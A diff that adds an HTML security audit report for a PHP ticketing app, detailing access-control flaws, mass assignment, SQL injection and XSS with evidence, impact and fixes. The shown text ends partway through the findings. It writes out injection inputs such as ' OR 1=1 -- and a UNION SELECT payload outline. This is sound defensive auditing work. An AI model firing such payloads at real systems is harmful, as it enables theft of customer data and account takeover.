@@ -1,0 +1,729 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'sha256-MvG1Y1OXXFh4tBOYtX9sG5URhwYMP8MBEzSXtqOVaCk='; img-src data:">
+<meta name="robots" content="noindex">
+<title>Security audit · php-tickets</title>
+<style>
+:root {
+  --paper: #f6f2ea; --paper-2: #efe9dd; --ink: #1d1b18; --ink-2: #5b554b; --rule: #d9d1c1;
+  --crit: #a3171d; --high: #cf3a1c; --med: #b7791f; --low: #4f6489; --safe: #1f7a4d; --fixed: #2f6f7e; --gap: #9a9184;
+  --tint-crit: #f3dcd8; --tint-safe: #dcebe1; --tint-gap: #e8e3da; --code: #ebe4d6;
+  /* Darker steps for severity badges that carry text (>= 4.5:1 with --paper); bars and dots keep the brighter ones. */
+  --high-ink: #b8330f; --med-ink: #94590a;
+  --display: "Iowan Old Style", "Palatino Linotype", Palatino, "Book Antiqua", Charter, "Bitstream Charter", Georgia, serif;
+  --text: "Avenir Next", "Segoe UI Variable Text", "Segoe UI", "Helvetica Neue", Ubuntu, Cantarell, sans-serif;
+  --mono: ui-monospace, "SF Mono", "JetBrains Mono", Menlo, Consolas, "DejaVu Sans Mono", monospace;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark) {
+  :root {
+    --paper: #16140f; --paper-2: #1e1b15; --ink: #ece6d8; --ink-2: #a89f8e;
+    --rule: #353025; --crit: #f0695e; --high: #f28c5b; --med: #e0b45a; --low: #8ea5cf; --safe: #5cc28c; --fixed: #6fb6c6; --gap: #8b8377;
+    --tint-crit: #3a1d19; --tint-safe: #17301f; --tint-gap: #29251e; --code: #24201a;
+    --high-ink: #f28c5b; --med-ink: #e0b45a;
+    color-scheme: dark;
+  }
+}
+* { box-sizing: border-box; }
+html { background: var(--paper); }
+body { margin: 0; color: var(--ink); font: 16px/1.55 var(--text); font-variant-numeric: tabular-nums; -webkit-font-smoothing: antialiased; }
+::selection { background: var(--crit); color: var(--paper); }
+:focus-visible { outline: 2px solid var(--crit); outline-offset: 3px; border-radius: 4px; }
+a { color: inherit; text-underline-offset: 3px; text-decoration-thickness: 1px; }
+code, pre { font-family: var(--mono); font-size: 0.86em; }
+code { background: var(--code); padding: 0.08em 0.35em; border-radius: 4px; overflow-wrap: anywhere; }
+pre { background: var(--code); padding: 0.9rem 1rem; border-radius: 10px; overflow-x: auto; line-height: 1.45; }
+pre code { background: none; padding: 0; }
+.wrap { max-width: 1180px; margin: 0 auto; padding: 0 clamp(16px, 4vw, 48px); display: grid; grid-template-columns: 200px minmax(0, 1fr); gap: 56px; }
+header { grid-column: 1 / -1; padding: 56px 0 28px; border-bottom: 1px solid var(--rule); }
+header .meta { color: var(--ink-2); font-size: 0.92rem; margin: 0 0 18px; }
+h1 { font: 600 clamp(2.4rem, 5vw, 3.6rem)/1.05 var(--display); letter-spacing: -0.02em; margin: 0 0 22px; }
+.verdict { font: 500 clamp(1.4rem, 2.6vw, 1.9rem)/1.25 var(--display); margin: 0 0 6px; max-width: 34ch; }
+.secondary { color: var(--ink-2); margin: 0 0 26px; }
+.ledger { display: flex; height: 14px; border-radius: 7px; overflow: hidden; background: var(--paper-2); gap: 2px; animation: reveal 900ms cubic-bezier(.2,.7,.1,1) 120ms both; }
+.ledger span { flex-grow: var(--n); min-width: 6px; }
+@keyframes reveal { from { clip-path: inset(0 100% 0 0); } to { clip-path: inset(0 0 0 0); } }
+@media (prefers-reduced-motion: reduce) { .ledger { animation: none; } }
+.legend { display: flex; flex-wrap: wrap; gap: 6px 18px; margin: 12px 0 0; padding: 0; list-style: none; font-size: 0.86rem; color: var(--ink-2); }
+.legend i { display: inline-block; width: 9px; height: 9px; border-radius: 50%; margin-right: 7px; vertical-align: 0; }
+.c-critical { background: var(--crit); } .c-high { background: var(--high); } .c-medium { background: var(--med); } .c-low { background: var(--low); }
+.c-fixed { background: var(--fixed); } .c-safe { background: var(--safe); } .c-gap { background: var(--gap); }
+.scope { margin: 18px 0 0; padding: 10px 14px; background: var(--tint-gap); border-radius: 10px; font-size: 0.92rem; }
+.profile p { margin: 0.25em 0; max-width: 90ch; }
+nav { position: sticky; top: 0; align-self: start; padding-top: 28px; }
+nav ol { list-style: none; margin: 0; padding: 0; }
+nav a { display: flex; justify-content: space-between; padding: 6px 0; text-decoration: none; color: var(--ink-2); border-bottom: 1px solid transparent; }
+nav a:hover { color: var(--ink); border-bottom-color: var(--rule); }
+nav b { font-weight: 500; color: var(--ink); }
+main { padding: 28px 0 96px; min-width: 0; }
+h2 { font: 600 1.75rem/1.2 var(--display); letter-spacing: -0.015em; margin: 72px 0 6px; scroll-margin-top: 24px; }
+main > h2:first-child { margin-top: 0; }
+h2 + .lede { color: var(--ink-2); margin: 0 0 22px; max-width: 70ch; }
+h3 { font: 600 0.8rem/1 var(--text); letter-spacing: 0.08em; text-transform: uppercase; color: var(--ink-2); margin: 34px 0 10px; }
+.first { counter-reset: n; list-style: none; padding: 0; margin: 0 0 8px; }
+.first li { counter-increment: n; display: grid; grid-template-columns: 2.2rem minmax(0, 1fr); padding: 14px 0; border-top: 1px solid var(--rule); }
+.first li::before { content: counter(n); font: 600 1.5rem/1.1 var(--display); color: var(--crit); }
+.first a { font-weight: 600; text-decoration: none; }
+.first a:hover { text-decoration: underline; }
+.first small { display: block; color: var(--ink-2); margin-top: 2px; }
+.row { border-top: 1px solid var(--rule); }
+.row:last-child { border-bottom: 1px solid var(--rule); }
+.row summary { display: flex; flex-wrap: wrap; align-items: baseline; gap: 6px 12px; padding: 14px 4px; cursor: pointer; list-style: none; }
+.row summary::-webkit-details-marker { display: none; }
+.row summary:hover .title { text-decoration: underline; text-decoration-color: var(--rule); }
+.row[open] summary { background: var(--paper-2); }
+.sev { font: 600 0.72rem/1 var(--text); letter-spacing: 0.06em; text-transform: uppercase; padding: 4px 7px; border-radius: 5px; color: var(--paper); }
+.sev-critical .sev { background: var(--crit); } .sev-high .sev { background: var(--high-ink); } .sev-medium .sev { background: var(--med-ink); } .sev-low .sev { background: var(--low); }
+.title { font-weight: 600; flex: 1 1 320px; }
+.loc { font: 0.82rem var(--mono); color: var(--ink-2); flex-basis: 100%; padding-left: 0; overflow-wrap: anywhere; }
+.chip { font-size: 0.75rem; padding: 2px 8px; border-radius: 999px; white-space: nowrap; }
+.chip-proof { background: var(--crit); color: var(--paper); }
+.chip-static { box-shadow: inset 0 0 0 1px var(--ink-2); color: var(--ink-2); }
+.chip-warn { background: var(--med-ink); color: var(--paper); }
+.chip-muted { box-shadow: inset 0 0 0 1px var(--gap); color: var(--ink-2); }
+.body { padding: 4px 4px 22px; max-width: 78ch; }
+.body h4 { font: 600 0.78rem/1 var(--text); letter-spacing: 0.06em; text-transform: uppercase; color: var(--ink-2); margin: 20px 0 6px; }
+.body p, .body li { margin: 0.3em 0; }
+.body .meta { color: var(--ink-2); font-size: 0.85rem; margin-top: 18px; }
+.diff { list-style: none; padding: 0; margin: 0; }
+.diff li { padding: 10px 0; border-top: 1px solid var(--rule); }
+.diff .why { color: var(--ink-2); font-size: 0.9rem; display: block; }
+.good, .gap { list-style: none; padding: 0; margin: 0; }
+.good li, .gap li { display: grid; grid-template-columns: 22px minmax(0, 1fr); gap: 0 12px; padding: 12px 0; border-top: 1px solid var(--rule); }
+.good svg { color: var(--safe); margin-top: 3px; } .gap svg { color: var(--gap); margin-top: 3px; }
+.good .why, .gap .why { color: var(--ink-2); font-size: 0.94rem; display: block; max-width: 72ch; }
+.good code { font-size: 0.8rem; }
+.prod .how { display: block; margin-top: 4px; font-size: 0.94rem; max-width: 72ch; }
+.prod .chip { vertical-align: 1px; }
+details.cat > summary { cursor: pointer; padding: 10px 0; font-weight: 600; list-style: none; display: flex; justify-content: space-between; border-top: 1px solid var(--rule); }
+details.cat > summary::-webkit-details-marker { display: none; }
+details.cat > summary span { color: var(--safe); font-weight: 500; }
+.band-safe { background: var(--tint-safe); border-radius: 14px; padding: 6px 20px 14px; }
+.band-gap { background: var(--tint-gap); border-radius: 14px; padding: 6px 20px 14px; }
+table { width: 100%; border-collapse: collapse; font-size: 0.9rem; }
+th { text-align: left; font: 600 0.74rem/1 var(--text); letter-spacing: 0.06em; text-transform: uppercase; color: var(--ink-2); padding: 10px 8px; border-bottom: 1px solid var(--rule); }
+td { padding: 9px 8px; border-bottom: 1px solid var(--rule); vertical-align: top; }
+td.mono { font: 0.8rem var(--mono); overflow-wrap: anywhere; }
+td.where { width: 46%; }
+.score { display: inline-block; height: 6px; border-radius: 3px; background: var(--high); vertical-align: middle; margin-right: 8px; }
+.tablewrap { overflow-x: auto; }
+.empty { color: var(--ink-2); padding: 14px 0; border-top: 1px solid var(--rule); }
+footer { grid-column: 1 / -1; border-top: 1px solid var(--rule); padding: 24px 0 48px; color: var(--ink-2); font-size: 0.85rem; }
+@media (max-width: 860px) {
+  .wrap { grid-template-columns: 1fr; gap: 0; }
+  nav { position: static; padding-top: 20px; }
+  nav ol { display: flex; flex-wrap: wrap; gap: 4px 16px; }
+  nav a { gap: 6px; min-height: 44px; align-items: center; }
+}
+@media print { nav, .ledger { display: none; } .wrap { display: block; } h2 { break-after: avoid; } .row { break-inside: avoid; } }
+</style>
+</head>
+<body>
+<div class="wrap">
+<header>
+<p class="meta">Security audit · 2026-11-02 · commit 39f3c81 · deps: no lockfile found · secrets: gitleaks: 0 hits, 1 commits of this repo</p>
+<h1>app</h1>
+<p class="verdict">18 issues to fix (2 critical, 7 high, 6 medium, 3 low).</p>
+<p class="secondary">14 areas verified safe · 7 checks not assessed</p>
+<div class="ledger" role="img" aria-label="2 critical, 7 high, 6 medium, 3 low, 14 verified safe, 7 not assessed"><span class="c-critical" style="--n:2"></span><span class="c-high" style="--n:7"></span><span class="c-medium" style="--n:6"></span><span class="c-low" style="--n:3"></span><span class="c-safe" style="--n:14"></span><span class="c-gap" style="--n:7"></span></div>
+<ul class="legend"><li><i class="c-critical"></i>2 critical</li><li><i class="c-high"></i>7 high</li><li><i class="c-medium"></i>6 medium</li><li><i class="c-low"></i>3 low</li><li><i class="c-safe"></i>14 verified safe</li><li><i class="c-gap"></i>7 not assessed</li></ul>
+
+<div class="scope profile"><p><strong>Profile: PHP (Laravel, Symfony, Drupal): dedicated profile.</strong></p><p>Covers: Laravel routes/*.php entry points with their middleware groups, prefixes and withoutMiddleware; Symfony #[Route]/@Route and config/routes*.yaml entry points with IsGranted, denyAccessUnlessGranted and the security.yaml access_control rule; Drupal *.routing.yml entry points with their access requirements and controllers; PHP hotspot ranking by the controller method a route calls: no auth middleware, _access TRUE, GET state change without _csrf_token, record loaded by id with no ownership check, *Raw/DB:: or DQL/SQL built from strings, $request-&gt;all() mass assignment, uploads under the client file name, Markup::create/#markup, unserialize, shell calls; Blade {!! !!}, Twig |raw, $guarded = [], debug on and CSRF exceptions; PHP, Laravel, Symfony and Drupal stack patterns and checklist sections for the auditors; dependency advisories on composer.lock (osv-scanner, composer audit as fallback) and secrets in git history (gitleaks).</p><p>Does not cover: no Eloquent or Doctrine tenant-scope scan: the ranking flags id loads without an ownership check, auditors confirm the scope by hand; Psalm taint analysis is not run: it executes the project&#39;s autoloader and plugins (prepass.md says how to run it in a sandbox); routes of other PHP frameworks (WordPress, Slim, CakePHP, Yii, Laminas) are not enumerated: recon finds those entry points by reading the code; rule scanners (semgrep, zizmor, hadolint, trivy, bandit, gosec, govulncheck) run only when installed or docker is available; one that did not run is listed in not-assessed.md.</p></div>
+
+</header>
+<nav aria-label="Sections"><ol><li><a href="#fix">To fix <b>18</b></a></li><li><a href="#safe">Verified safe <b>14</b></a></li><li><a href="#gaps">Not assessed <b>7</b></a></li><li><a href="#prod">Production checklist <b>5</b></a></li><li><a href="#hotspots">Hotspots <b>20</b></a></li><li><a href="#deps">Dependencies <b>0</b></a></li><li><a href="#secrets">Secrets <b>0</b></a></li><li><a href="#filtered">Filtered out <b>0</b></a></li></ol></nav>
+<main>
+<h2 id="fix">To fix</h2>
+<p class="lede">Verified findings, most severe first. “Failing test” means a regression test in the project’s own runner fails today; “code reading only” means it was confirmed by tracing the code.</p>
+<h3>Fix first</h3>
+<ol class="first"><li><div><a href="#auth-101">Ticket export API is public: anyone downloads the latest 5000 tickets with customer e-mails</a><small>critical · code reading only · routes/api.php:12</small></div></li><li><div><a href="#auth-112">Drupal ticket JSON endpoint open to everyone (<code>_access: &#39;TRUE&#39;</code>) returns any ticket by id</a><small>critical · code reading only · portal/web/modules/custom/helpdesk_portal/helpdesk_portal.routing.yml:9-15</small></div></li><li><div><a href="#auth-102">IDOR on GET /tickets/{id}: any signed-in user reads any ticket with its comments and attachments</a><small>high · code reading only · app/Http/Controllers/TicketController.php:30-35</small></div></li></ol>
+<h3>critical · 2</h3><details class="row sev-critical" id="auth-101">
+<summary><span class="sev">critical</span><span class="title">Ticket export API is public: anyone downloads the latest 5000 tickets with customer e-mails</span><span class="chip chip-static">Code reading only</span><span class="loc">routes/api.php:12</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p>Move the route into the admin group (<code>Route::middleware([&#39;auth:sanctum&#39;, &#39;can:admin&#39;])</code>) or add <code>$this-&gt;authorize(&#39;admin&#39;)</code> in <code>export()</code>. Add a feature test asserting 401 for anonymous and 403 for a non-admin token.</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>routes/api.php:12</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>Route::middleware(&#39;auth:sanctum&#39;)-&gt;group(function () {
+    Route::get(&#39;/tickets&#39;, [TicketApiController::class, &#39;index&#39;]);
+    Route::get(&#39;/tickets/{ticket}&#39;, [TicketApiController::class, &#39;show&#39;]);
+});
+
+Route::get(&#39;/reports/export&#39;, [ReportController::class, &#39;export&#39;]);</code></pre>
+<ul>
+<li><strong>File</strong>: <code>app/Http/Controllers/ReportController.php:23-34</code></li>
+</ul>
+<pre><code>public function export(Request $request)
+{
+    $tickets = Ticket::with(&#39;user:id,name,email&#39;)-&gt;latest()-&gt;limit(5000)-&gt;get();
+    $csv = $tickets-&gt;map(fn ($t) =&gt; implode(&#39;,&#39;, [ $t-&gt;id, $t-&gt;status, $t-&gt;user-&gt;email, str_replace(&#39;,&#39;, &#39; &#39;, $t-&gt;subject) ]))...
+    return response($csv, 200, [&#39;Content-Type&#39; =&gt; &#39;text/csv&#39;]);
+}</code></pre></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: anonymous HTTP GET /api/reports/export (<code>routes/api.php:12</code>)</li>
+<li><strong>Transformations</strong>: none; the route sits outside the <code>auth:sanctum</code> group and outside the <code>admin</code> web group; the handler has no <code>authorize</code>/gate call</li>
+<li><strong>Sink</strong>: CSV response with ticket id, status, owner e-mail and subject of every customer (<code>app/Http/Controllers/ReportController.php:25-34</code>)</li>
+<li><strong>Sanitization</strong>: none</li>
+<li><strong>Verdict</strong>: VULNERABLE</li>
+</ul></section>
+<section><h4>Impact</h4><p>Anyone on the internet, without an account, downloads the 5000 newest tickets of all customers with each owner&#39;s e-mail address and ticket subject. The other report (<code>/admin/reports/tickets</code>) is behind <code>can:admin</code>, so this one is clearly meant to be staff-only.</p></section>
+<section><h4>Regression test</h4><p>proof: static — the repository has no test suite, no <code>vendor/</code> and PHP is not installed on the audit host, so no Laravel feature test can run.</p></section>
+<section><h4>Chained with</h4><ul>
+<li>injection-110 (CSV formula injection in the same export)</li>
+</ul></section>
+<p class="meta">auth-101 · Authentication &amp; authorization</p>
+</div></details>
+<details class="row sev-critical" id="auth-112">
+<summary><span class="sev">critical</span><span class="title">Drupal ticket JSON endpoint open to everyone (<code>_access: &#39;TRUE&#39;</code>) returns any ticket by id</span><span class="chip chip-static">Code reading only</span><span class="loc">portal/web/modules/custom/helpdesk_portal/helpdesk_portal.routing.yml:9-15</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p>Require <code>_permission: &#39;access helpdesk portal&#39;</code> and add <code>-&gt;condition(&#39;uid&#39;, currentUser()-&gt;id())</code> (bound) to the query, returning 404 otherwise.</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>portal/web/modules/custom/helpdesk_portal/helpdesk_portal.routing.yml:9-15</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>helpdesk_portal.ticket_json:
+  path: &#39;/portal/api/tickets/{ticket_id}&#39;
+  ...
+  requirements:
+    _access: &#39;TRUE&#39;
+    ticket_id: &#39;\d+&#39;</code></pre>
+<ul>
+<li><strong>File</strong>: <code>portal/web/modules/custom/helpdesk_portal/src/Controller/PortalController.php:38-44</code></li>
+</ul>
+<pre><code>$ticket = \Drupal::database()
+    -&gt;query(&#39;SELECT id, uid, subject, body, status FROM {helpdesk_ticket} WHERE id = :id&#39;, [&#39;:id&#39; =&gt; $ticket_id])
+    -&gt;fetchAssoc();
+return new JsonResponse($ticket ?: [&#39;error&#39; =&gt; &#39;not found&#39;], $ticket ? 200 : 404);</code></pre></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: <code>{ticket_id}</code> path parameter, anonymous</li>
+<li><strong>Transformations</strong>: <code>\d+</code> and int</li>
+<li><strong>Sink</strong>: JSON with uid, subject, body, status</li>
+<li><strong>Sanitization</strong>: no permission, no <code>uid</code> condition (unlike <code>setStatus</code>, <code>:71</code>)</li>
+<li><strong>Verdict</strong>: VULNERABLE</li>
+</ul></section>
+<section><h4>Impact</h4><p>Anyone without an account enumerates <code>/portal/api/tickets/1..N</code> and reads the subject and full body of every helpdesk ticket mirrored in the portal, plus the owner&#39;s Drupal uid. The module description says tickets are shown &quot;to signed-in customers&quot;.</p></section>
+<section><h4>Regression test</h4><p>proof: static — no test suite, no Drupal core in the repo, no PHP on the audit host.</p></section>
+<section><h4>Chained with</h4><ul>
+<li>none</li>
+</ul></section>
+<p class="meta">auth-112 · Authentication &amp; authorization</p>
+</div></details>
+<h3>high · 7</h3><details class="row sev-high" id="auth-102">
+<summary><span class="sev">high</span><span class="title">IDOR on GET /tickets/{id}: any signed-in user reads any ticket with its comments and attachments</span><span class="chip chip-static">Code reading only</span><span class="loc">app/Http/Controllers/TicketController.php:30-35</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p>Use route model binding and a policy: add <code>view(User $user, Ticket $ticket)</code> to <code>TicketPolicy</code> (<code>$user-&gt;is_admin || $ticket-&gt;user_id === $user-&gt;id</code>) and call <code>$this-&gt;authorize(&#39;view&#39;, $ticket)</code> in <code>show()</code>.</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>app/Http/Controllers/TicketController.php:30-35</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>public function show(Request $request, int $id)
+{
+    $ticket = Ticket::with([&#39;comments.author&#39;, &#39;attachments&#39;])-&gt;findOrFail($id);
+
+    return view(&#39;tickets.show&#39;, [&#39;ticket&#39; =&gt; $ticket]);
+}</code></pre>
+<ul>
+<li>Route: <code>routes/web.php:19</code> <code>Route::get(&#39;/tickets/{id}&#39;, [TicketController::class, &#39;show&#39;])</code> inside <code>middleware(&#39;auth&#39;)</code> only.</li>
+</ul></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: <code>{id}</code> path parameter (<code>routes/web.php:19</code>)</li>
+<li><strong>Transformations</strong>: cast to int</li>
+<li><strong>Sink</strong>: <code>Ticket::findOrFail($id)</code> rendered in <code>resources/views/tickets/show.blade.php</code> (subject, body, comments, attachment links)</li>
+<li><strong>Sanitization</strong>: authentication only; no <code>authorize(&#39;view&#39;, ...)</code>, no <code>user_id</code> condition. <code>TicketPolicy</code> (<code>app/Policies/TicketPolicy.php:10</code>) only defines <code>update</code>, and <code>update()</code>/comments/attachments call it, <code>show()</code> does not.</li>
+<li><strong>Verdict</strong>: VULNERABLE</li>
+</ul></section>
+<section><h4>Impact</h4><p>Any signed-in customer enumerates sequential ticket ids and reads every other customer&#39;s ticket: subject, body, all comments with author names, and links to the attachments. The README states &quot;customers only see their own tickets&quot;; the mobile API equivalent (<code>TicketApiController::show</code>) does check ownership, the web route does not.</p></section>
+<section><h4>Regression test</h4><p>proof: static — no test suite, no <code>vendor/</code>, no PHP on the audit host.</p></section>
+<section><h4>Chained with</h4><ul>
+<li>upload-104 (attachment links disclosed here are public URLs)</li>
+</ul></section>
+<p class="meta">auth-102 · Authentication &amp; authorization</p>
+</div></details>
+<details class="row sev-high" id="auth-103">
+<summary><span class="sev">high</span><span class="title">Mass assignment in profile update lets any customer make themselves admin (is_admin) or set any column</span><span class="chip chip-static">Code reading only</span><span class="loc">app/Http/Controllers/ProfileController.php:14-24</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p><code>$request-&gt;user()-&gt;update($request-&gt;validate([...]))</code> (only validated fields) and replace <code>$guarded = []</code> with an explicit <code>$fillable = [&#39;name&#39;, &#39;email&#39;]</code> on <code>User</code>. Set <code>is_admin</code> only through <code>forceFill</code> in admin code.</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>app/Http/Controllers/ProfileController.php:14-24</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>public function update(Request $request)
+{
+    $request-&gt;validate([
+        &#39;name&#39; =&gt; [&#39;required&#39;, &#39;string&#39;, &#39;max:120&#39;],
+        &#39;email&#39; =&gt; [&#39;required&#39;, &#39;email&#39;, &#39;unique:users,email,&#39;.$request-&gt;user()-&gt;id],
+    ]);
+
+    $request-&gt;user()-&gt;update($request-&gt;all());</code></pre>
+<ul>
+<li><strong>File</strong>: <code>app/Models/User.php:13</code> <code>protected $guarded = [];</code></li>
+<li><strong>File</strong>: <code>app/Providers/AppServiceProvider.php:13</code> <code>Gate::define(&#39;admin&#39;, fn (User $user) =&gt; $user-&gt;is_admin);</code></li>
+</ul></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: POST /account/profile body (<code>routes/web.php:26</code>)</li>
+<li><strong>Transformations</strong>: <code>validate()</code> checks only <code>name</code> and <code>email</code> but the result is discarded; <code>$request-&gt;all()</code> passes every field</li>
+<li><strong>Sink</strong>: <code>User::update()</code> with <code>$guarded = []</code> (every column fillable): <code>is_admin</code>, <code>password</code> (cast <code>hashed</code>), <code>email</code>, <code>remember_token</code>, <code>avatar_path</code></li>
+<li><strong>Sanitization</strong>: none for extra fields</li>
+<li><strong>Verdict</strong>: VULNERABLE</li>
+</ul></section>
+<section><h4>Impact</h4><p>Any signed-in customer sends <code>is_admin=1</code> with their profile form and passes the <code>admin</code> gate: they reach <code>/admin/users</code> (list of all users), <code>DELETE /admin/users/{user}</code> (delete any account) and the admin reports, and as staff they see every ticket. The same request also changes the password without the current password.</p></section>
+<section><h4>Regression test</h4><p>proof: static — no test suite, no <code>vendor/</code>, no PHP on the audit host.</p></section>
+<section><h4>Chained with</h4><ul>
+<li>auth-105 (the route is CSRF-exempt, so a same-site page can submit this form for a victim)</li>
+</ul></section>
+<p class="meta">auth-103 · Authentication &amp; authorization</p>
+</div></details>
+<details class="row sev-high" id="chain-901">
+<summary><span class="sev">high</span><span class="title">Portal SQL injection + Markup::create = reflected XSS by link against any portal user (including Drupal admins)</span><span class="chip chip-static">Code reading only</span><span class="loc">portal/web/modules/custom/helpdesk_portal/src/Controller/PortalController.php:22</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p>Fixing either link breaks the chain; fix both (placeholder in the query, no <code>Markup::create</code> on data).</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>portal/web/modules/custom/helpdesk_portal/src/Controller/PortalController.php:22</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>-&gt;query(&quot;SELECT id, subject, status, last_reply FROM {helpdesk_ticket} WHERE cc_mail = &#39;&quot; . $mail . &quot;&#39;&quot;)
+...
+foreach (array_merge($rows, $shared) as $row) {
+    ...
+    if ($row-&gt;last_reply) {
+        $items[] = [&#39;#markup&#39; =&gt; Markup::create(&#39;&lt;blockquote&gt;&#39; . $row-&gt;last_reply . &#39;&lt;/blockquote&gt;&#39;)];
+    }</code></pre>
+<ul>
+<li><strong>File</strong>: <code>PortalController.php:31</code> (sink)</li>
+</ul></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: <code>?cc=</code> in a crafted link, e.g. <code>cc=x&#39; UNION SELECT 1,&#39;s&#39;,&#39;open&#39;,0x&lt;hex of an img/onerror payload&gt; -- </code> (no <code>;</code> or braces in the payload, see Verification)</li>
+<li><strong>Transformations</strong>: the UNION row becomes a <code>$row</code> whose <code>last_reply</code> is attacker HTML (injection-108)</li>
+<li><strong>Sink</strong>: <code>Markup::create</code> (<code>:31</code>), unfiltered (injection-111)</li>
+<li><strong>Sanitization</strong>: none; render cache varies by <code>user</code> and <code>url.query_args</code> (<code>:35</code>), so the payload is per URL, not cached for others</li>
+<li><strong>Verdict</strong>: VULNERABLE</li>
+</ul></section>
+<section><h4>Impact</h4><p>An attacker with no portal account sends a link to /portal/tickets?cc=…; any victim holding <code>access helpdesk portal</code> (customers, and Drupal administrators, who hold every permission) runs attacker script on the portal origin. Against an administrator this means creating admin users or changing site configuration. The stored variant depends on who writes <code>last_reply</code>; this one needs no stored data.</p></section>
+<section><h4>Regression test</h4><p>proof: static — no Drupal core in the repo, no PHP on the audit host.</p></section>
+<section><h4>Chained with</h4><ul>
+<li>injection-108, injection-111</li>
+</ul></section>
+<p class="meta">chain-901 · Chains</p>
+</div></details>
+<details class="row sev-high" id="injection-106">
+<summary><span class="sev">high</span><span class="title">SQL injection in ticket search (<code>q</code>) via whereRaw string interpolation</span><span class="chip chip-static">Code reading only</span><span class="loc">app/Http/Controllers/TicketController.php:13-18</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p><code>-&gt;where(&#39;subject&#39;, &#39;like&#39;, &#39;%&#39;.addcslashes($q, &#39;%_\\&#39;).&#39;%&#39;)</code> (bound parameter).</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>app/Http/Controllers/TicketController.php:13-18</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>$q = $request-&gt;query(&#39;q&#39;);
+
+$tickets = $request-&gt;user()-&gt;tickets()
+    -&gt;when($q, fn ($query) =&gt; $query-&gt;whereRaw(&quot;subject LIKE &#39;%{$q}%&#39;&quot;))
+    -&gt;latest()
+    -&gt;paginate(20);</code></pre></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: <code>?q=</code> on GET /tickets (<code>routes/web.php:17</code>, any signed-in user)</li>
+<li><strong>Transformations</strong>: none</li>
+<li><strong>Sink</strong>: raw SQL fragment in <code>whereRaw</code> (<code>TicketController.php:16</code>), executed by both the paginate count query and the select</li>
+<li><strong>Sanitization</strong>: none; no bindings used</li>
+<li><strong>Verdict</strong>: VULNERABLE</li>
+</ul></section>
+<section><h4>Impact</h4><p>Any signed-in customer breaks out of the LIKE string (<code>&#39; OR 1=1 -- </code>) to list every customer&#39;s tickets, or uses boolean or time-based blind payloads to read any table the DB user can read, including <code>users</code> password hashes and <code>remember_token</code>s (UNION does not fit, see Verification).</p></section>
+<section><h4>Regression test</h4><p>proof: static — no test suite, no <code>vendor/</code>, no PHP on the audit host.</p></section>
+<section><h4>Chained with</h4><ul>
+<li>none</li>
+</ul></section>
+<p class="meta">injection-106 · Injection &amp; SSRF</p>
+</div></details>
+<details class="row sev-high" id="injection-107">
+<summary><span class="sev">high</span><span class="title">Stored XSS: ticket comments rendered unescaped with {!! !!}</span><span class="chip chip-static">Code reading only</span><span class="loc">resources/views/tickets/show.blade.php:20</span></summary>
+<div class="body">
+<section><h4>How to fix</h4><p>Render with <code>{!! nl2br(e($comment-&gt;body)) !!}</code> like the ticket body on line 8, or <code>{{ }}</code>; if rich text is wanted, sanitize on output with an HTML purifier allow-list.</p></section>
+<section><h4>Evidence</h4><ul>
+<li><strong>File</strong>: <code>resources/views/tickets/show.blade.php:20</code></li>
+<li><strong>Code</strong>:</li>
+</ul>
+<pre><code>@foreach ($ticket-&gt;comments as $comment)
+    &lt;div class=&quot;comment&quot;&gt;
+        &lt;strong&gt;{{ $comment-&gt;author-&gt;name }}&lt;/strong&gt;
+        &lt;div class=&quot;comment-body&quot;&gt;{!! $comment-&gt;body !!}&lt;/div&gt;
+    &lt;/div&gt;
+@endforeach</code></pre>
+<ul>
+<li><strong>File</strong>: <code>app/Http/Controllers/CommentController.php:14-18</code></li>
+</ul>
+<pre><code>$data = $request-&gt;validate([&#39;body&#39; =&gt; [&#39;required&#39;, &#39;string&#39;, &#39;max:5000&#39;]]);
+$ticket-&gt;comments()-&gt;create([ &#39;body&#39; =&gt; $data[&#39;body&#39;], &#39;user_id&#39; =&gt; $request-&gt;user()-&gt;id ]);</code></pre></section>
+<section><h4>Data flow</h4><ul>
+<li><strong>Source</strong>: <code>body</code> on POST /tickets/{ticket}/comments (<code>routes/web.php:22</code>), ticket owner (<code>CommentController.php:12</code>, <code>TicketPolicy::update</code>)</li>
+<li><strong>Transformations</strong>: validated as string ≤5000, stored as-is</li>
+<li><strong>Sink</strong>: <code>{!! $comment-&gt;body !!}</code> (<code>show.blade.php:20</code>)</li>
+<li><strong>Sanitization</strong>: none on the web path (the mail-webhook path applies <code>strip_tags</code>, <code>MailWebhookController.php:20</code>)</li>
+<li><strong>Verdict</strong>: VULNERABLE</li>
+</ul></section>
